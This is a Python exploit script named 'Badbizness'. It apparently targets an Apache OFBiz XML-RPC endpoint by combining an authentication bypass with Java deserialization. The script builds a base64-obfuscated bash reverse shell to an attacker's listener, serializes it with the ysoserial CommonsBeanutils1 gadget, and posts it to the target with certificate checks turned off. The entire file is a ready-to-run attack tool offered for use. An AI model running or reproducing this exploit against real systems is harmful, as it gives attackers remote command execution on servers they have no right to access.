#!/usr/bin/python3
import sys
import subprocess
import requests

import base64

import urllib3
urllib3.disable_warnings()

from colorama import Fore, Style

startScreen = """
=================================================================
       ______           _ _     _                         
       | ___ \         | | |   (_)                        
       | |_/ / __ _  __| | |__  _ _____ __   ___  ___ ___ 
       | ___ \/ _` |/ _` | '_ \| |_  / '_ \ / _ \/ __/ __|
       | |_/ / (_| | (_| | |_) | |/ /| | | |  __/\__ \__ \\
       \____/ \__,_|\__,_|_.__/|_/___|_| |_|\___||___/___/

                                v1.0
                        written by twopoint                         
=================================================================
"""
usage = """ 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[USAGE] python3 badbizness.py [path to ysoserial-all.jar] [TARGET BASE URL] [LISTENER IP] [LISTENER PORT]

[EXAMPLE] python3 badbizness.py /home/twopoint/ysoserial-all.jar http://example.com:1337 10.10.10.10. 1337

Badbizness requires jar file ysoserial-all.jar and OpenJDK version 11.

ysoserial-all.jar can be found at https://github.com/frohoff/ysoserial/releases

Download OpenJDK : sudo apt-get install openjdk-11-jdk
Swap Java versions: sudo update-java-alternatives --set /usr/lib/jvm/java-1.11.0-openjdk-amd64
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"""

def checkArgs(args):
    if len(args) != 5:
        print("Incorrect argument syntax.")
        print(Fore.YELLOW + usage)
        sys.exit()
    return

def genPayload(path):

    # TCP revshell oneliner
    revShell = f"bash -i >& /dev/tcp/{sys.argv[3]}/{sys.argv[4]} 0>&1"

    # Base 64 encode and pipe to bash
    encodeShell = base64.b64encode(revShell.encode()).decode()
    bashPipe = f"bash -c echo${{IFS}}{encodeShell}|base64${{IFS}}-d|bash"

    # Serialize bash pipe payload
    try:
        serialShell = subprocess.check_output(["java","-jar",sys.argv[1],"CommonsBeanutils1", bashPipe,])
        serialShell = base64.b64encode(serialShell).decode()
    except:
        print(Fore.RED + "[-] Payload generation error. Check your ysoserial-all.jar path or OpenJDK version.")
        print(Fore.YELLOW + usage)
        sys.exit()

    return serialShell

def getShell(payload, baseURL):

    # Define vulnerable request URL. THIS MAY NEED TUNING...
    fullURL = str(baseURL) + "/webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y"
    header = {'Content-Type': 'application/xml'}

    # XML Wrapper for serialized injection
    reqBody =f"""<?xml version="1.0"?>
<methodCall>
    <methodName>twopoint</methodName>
    <params>
        <param>
            <value>
                <struct>
                    <member>
                    <name>xd</name>
                        <value>
                            <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">
                            
                            {payload}
                            </serializable>
                        </value>
                    </member>
                </struct>
            </value>
        </param>
    </params>
</methodCall>
        """
    
    # Make request
    try:
        inject = requests.post(url=fullURL, data=reqBody, headers=header, verify=False)
    except:
        print(Fore.RED + "[-] Shell request failed. Check URL.")
        sys.exit()

    print(Fore.GREEN + "[+] Payload executed. Check your listener!")

    return

def run(): # Run program

    # Start screen
    print(Fore.CYAN + startScreen + Style.RESET_ALL) 

    # Check sys args
    checkArgs(sys.argv)
    print(Fore.GREEN + "[+] Starting Badbizness..."+ Style.RESET_ALL)

    # Generate serialized revshell payload
    payload = genPayload(sys.argv[1])
    print(Fore.GREEN + "[+] Payload generation successful!")
    
    # Inject payload into request
    print(Fore.YELLOW + "[~] Attempting to get reverse shell...")
    getShell(payload, sys.argv[2])

    return

run()